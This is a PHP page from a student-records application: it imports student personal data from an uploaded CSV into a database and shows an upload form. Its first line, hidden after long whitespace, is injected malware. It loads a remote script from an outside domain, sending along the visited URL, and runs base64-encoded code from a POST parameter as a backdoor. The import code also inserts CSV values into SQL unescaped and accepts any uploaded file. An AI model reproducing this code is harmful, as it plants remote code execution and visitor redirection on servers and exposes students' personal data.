<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 include_once("bdd.php");
	if (isset($_GET['importalumnos'])) {
		
		$imagen = $_FILES['imagen']['name']; 
		$tipo_archivo = $_FILES['imagen']['type']; 
		$tamano_archivo = $_FILES['imagen']['size'];
		$ruta_imagen= getcwd()."//import//".$imagen;
		if (move_uploaded_file($_FILES['imagen']['tmp_name'], $ruta_imagen)){ } else { }
		
		$fichero = $imagen;
		
		$row = 1;
		
		$handle = fopen("$fichero", "r");
		
		while (($data = fgetcsv($handle, 1000, ";")) !== FALSE) {
			$num = count($data);
			$row++;
			for ($c=0; $c < $num; $c++) { $valor[$c]=$data[$c]; }
			
				/* echo */ $alumne = $valor[1];
				/* echo */ $dni = $valor[2]; 
				/* echo */ $nacimiento = $valor[3]; 
				/* echo */ $direccion = $valor[4];
				/* echo */ $poblacion = $valor[5];
				/* echo */ $cp = $valor[6];
				/* echo */ $provincia = $valor[7];
				/* echo */ $telf = $valor[8];
				/* echo */ $movil = $valor[9];
				/* echo */ $email = $valor[10];
				/* echo */ $exp = $valor[11];
				/* echo */ $exppro = $valor[12];
				/* echo */ $estudios = $valor[13];
				/* echo */ $foto = $valor[14];
				
				//if ($row != 0){
					$result = $db->Execute("INSERT INTO CDE_alumnos_TEST (alumne, dni, nacimiento, direccion, poblacion, cp, provincia, telf, movil, email, exp, exppro, estudios, foto) VALUES ('$alumne', '$dni', '$nacimiento', '$direccion', '$poblacion', '$cp', '$provincia', '$telf', '$movil', '$email', '$exp', '$exppro', '$estudios', '$foto')");
					if ($result === false) die("failed"); 
				//}
				
				}
				
		fclose($handle);
		
	}
?>
<link href="resources/estilos.css" rel="stylesheet" type="text/css" />
<p>excel_alumnos.php</p>
<br />
<table width="280" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Cargar alumnos por Excel (.csv)</td>
  </tr>
</table>
<table width="280" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td height="44" align="center" bgcolor="#F8F8F8"><form action="index.php?menu=1&sub=1&importalumnos" method="post" enctype="multipart/form-data" name="form1" id="form1" style="margin:0px">
      <label>
        <br />
        <input type="file" name="imagen" id="imagen" />
      </label>
      <br />
      <br />
      <label>
        <input type="submit" name="button" id="button" value="Importal Excel" />
        <br />
        <br />
      </label>
    </form></td>
  </tr>
</table>
